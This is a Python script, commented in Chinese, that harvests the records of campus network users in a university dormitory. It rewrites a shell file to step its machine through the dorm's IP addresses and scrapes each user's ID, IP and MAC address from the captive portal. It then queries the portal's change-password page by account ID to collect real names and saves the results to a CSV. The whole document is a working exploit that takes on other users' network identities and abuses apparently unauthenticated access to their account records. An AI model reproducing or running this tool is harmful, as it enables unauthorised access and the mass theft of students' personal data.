"""
注意使用该脚本爬取仲恺宿舍23栋校园网用户信息前，请确认网关是否相同，并在shell文件中设置第三位和第四位IP位
"""


def run_cmd(cmd_str='', echo_print=1):
    """
    执行cmd命令，不显示执行过程中弹出的黑框
    备注：subprocess.run()函数会将本来打印到cmd上的内容打印到python执行界面上，所以避免了出现cmd弹出框的问题
    :param echo_print:
    :param cmd_str: 执行的cmd命令
    :return:
    """
    from subprocess import run
    if echo_print == 1:
        print('\n执行指令="{}"'.format(cmd_str))
    run(cmd_str, shell=True)


def generate_csv(group):
    import pandas as pd
    """
    储存爬取的信息，生成csv文件
    :param group: 爬取过程中储存的数组
    """
    netdata = pd.DataFrame(group)
    netdata.to_csv("net_userinfo.csv", mode='a')


def update_file(file, old_str, new_str):
    """
    替换文件中的字符串
    :param file:文件名
    :param old_str:旧字符串
    :param new_str:新字符串
    :return:
    """
    file_data = ""
    with open(file, "r+", encoding="ANSI") as f:
        for line in f:
            line = line.replace(old_str, new_str)
            file_data += line
    with open(file, "w") as f:
        f.write(file_data)


def get_mac(file_path, i, j):
    """
    自动采集器
    :param file_path:
    :param i: IP第四位起始数值，请与shell文件值相同
    :param j: IP第三位起始数值，请与shell文件相同
    :return:
    """
    import time
    import requests
    from bs4 import BeautifulSoup
    group = []
    while True:
        try:
            run_cmd(file_path)
            time.sleep(4)
            # ---------开始抓取页面信息-------------
            url_net = "http://1.1.1.1"
            headers = {'user-agent': 'Mozilla/5.0'}
            reg = requests.get(url=url_net, headers=headers).text
            soup = BeautifulSoup(reg, 'html.parser')
            netinfo = {}
            userId = soup.find(id="userId")['value']
        except (requests.exceptions.ConnectionError, AttributeError, requests.exceptions.ChunkedEncodingError):
            print("获取速度过快，服务器遭不住啦，重试中......")
            continue
        # ----------每循环一次就会调用文本更改函数更新IP值----------------
        file = file_path
        old_str = f"rand_num={i}"
        new_str = f"rand_num={i + 1}"
        old_strs = f"rand_nu={j}"
        new_strs = f"rand_nu={j + 1}"
        old_str1 = "rand_num=256"
        new_str1 = "rand_num=1"  #
        i += 1
        update_file(file, old_str, new_str)
        if j > 38:  # 第三位IP终止值
            break
        if userId == "":
            # ---------值为空不抓取---------------
            print("信息为空，重试中。。。。。。")
            continue
        netinfo['userId'] = userId
        netinfo['wlanuserip'] = soup.find(id="wlanuserip")['value']
        netinfo['mac'] = soup.find(id="mac")['value']
        netinfo['macs'] = soup.find(id="mac")['value'].replace(":", "")
        netinfo['tip '] = soup.find(class_="succ-content").text.replace('\n', '')
        # ---------获取用户名字信息-------------
        url_netName = "http://1.1.1.1:8888/self/toChangePassword.do?accountId=" + userId
        regs = requests.get(url=url_netName, headers=headers).text
        soup = BeautifulSoup(regs, 'html.parser')
        netinfo['Name'] = soup.find(id="accountName")['value']
        # --------------调用函数把循环后的字典添加进数组中储存----------------
        group.append(netinfo)
        print(f"已执行{i}次")
        if i > 255:  # 第四位IP终止值
            update_file(file, old_str1, new_str1)  # 重置第四位IP
            i = 0
        if i == 255:
            update_file(file, old_strs, new_strs)  # 第三位IP进一位
            j += 1
            generate_csv(group)
        print(f"已成功获取到{len(group)}条数据")


file_path = "internet.cmd"  # shell文件路径
get_mac(file_path, 2, 33)   # 调用函数，路径，分别是第四位和第三位IP起始值
